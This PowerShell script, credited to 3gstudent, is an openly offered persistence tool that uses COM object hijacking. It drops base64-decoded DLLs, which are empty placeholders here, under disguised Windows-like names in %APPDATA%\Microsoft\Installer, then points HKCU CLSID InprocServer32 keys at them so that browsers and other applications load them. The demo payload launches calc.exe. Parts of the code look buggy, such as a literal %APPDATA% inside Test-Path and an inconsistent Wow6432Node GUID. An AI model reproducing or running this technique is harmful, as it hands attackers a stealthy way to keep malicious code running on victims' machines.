<#
.SYNOPSIS
This script allows you to use COM Object hijacking to maintain persistence.
Learn from:https://www.gdatasoftware.com/blog/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence
Code by: 3gstudent@3gstudent
License: BSD 3-Clause
Support x86 and x64 system.
Redefined CAccPropServicesClass and MMDeviceEnumerator.
These two instances are used by a lot of applications, for example by the browser (by using the CoCreateInstance() function). 
When you start iexplore.exe,it also starts calc.exe.

:)
#>

$calcmutexx86 = ""

$calcmutexx64 = ""


Write-Host "[*] Searching Folder..." 
if((Test-Path %APPDATA%\Microsoft\Installer\) -eq 0)
{
	Write-Host "[+] Create Folder:  $env:APPDATA\Microsoft\Installer\"
	new-item -path $env:APPDATA\Microsoft\ -name Installer -type directory | Out-Null
}

if((Test-Path "%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}") -eq 0)
{
	Write-Host "[+] Create Folder:  $env:APPDATA\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}"
	new-item -path $env:APPDATA\Microsoft\Installer -name "{BCDE0395-E52F-467C-8E3D-C4579291692E}" -type directory | Out-Null
}
Write-Host "[*] Detecting operating system..." 
if ([Environment]::Is64BitOperatingSystem)
{
        Write-Host "[+] OS: x64" 
        Write-Host "[*] Releasing file..."
        $fileContentBytes = [System.Convert]::FromBase64String($calcmutexx86) 
    	[System.IO.File]::WriteAllBytes($env:APPDATA+"\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x86-l1-1-0._dl",$fileContentBytes)
    	
		$fileContentBytes = [System.Convert]::FromBase64String($calcmutexx64) 
    	[System.IO.File]::WriteAllBytes($env:APPDATA+"\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x64-l1-1-0._dl",$fileContentBytes)
    	Write-Host "[+] Done."

        Write-Host "[*] Modifying registry..."  
        Write-Host "[*] 64-bit:"  
		$RegPath="HKCU:Software\Classes\CLSID\"
    	New-Item -type Directory $RegPath"{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}" | Out-Null
    	New-Item -type Directory $RegPath"{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" | Out-Null
    	New-ItemProperty $RegPath"{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" "(default)" -value $env:APPDATA"\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x64-l1-1-0._dl" -propertyType string | Out-Null
    	New-ItemProperty $RegPath"{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" ThreadingModel -value "Apartment" -propertyType string | Out-Null

        Write-Host "[*] 32-bit:" 
		$RegPath="HKCU:Software\Classes\Wow6432Node\CLSID\"
    	New-Item -type Directory $RegPath"{BCDE0395-E52F-467C-8E3D-C4579291692E}" | Out-Null
    	New-Item -type Directory $RegPath"{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32" | Out-Null
    	New-ItemProperty $RegPath"{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32" "(default)" -value $env:APPDATA"\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x86-l1-1-0._dl" -propertyType string | Out-Null
    	New-ItemProperty $RegPath"{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32" ThreadingModel -value "Apartment" -propertyType string | Out-Null
    	Write-Host "[+] Done."
}
else
{
        Write-Host "[+] OS: x86"
        Write-Host "[*] Releasing file..."     
		$fileContentBytes = [System.Convert]::FromBase64String($calcmutexx86) 
    	[System.IO.File]::WriteAllBytes($env:APPDATA+"\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x86-l1-1-0._dl",$fileContentBytes)
    	Write-Host "[+] Done."

        Write-Host "[*] Modifying registry..."  
		$RegPath="HKCU:Software\Classes\CLSID\"
    	New-Item -type Directory $RegPath"{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}" | Out-Null
    	New-Item -type Directory $RegPath"{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" | Out-Null
    	New-ItemProperty $RegPath"{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" "(default)" -value $env:APPDATA"\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\api-ms-win-downlevel-1x86-l1-1-0._dl" -propertyType string | Out-Null
    	New-ItemProperty $RegPath"{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" ThreadingModel -value "Apartment" -propertyType string | Out-Null
    	Write-Host "[+] Done."
}

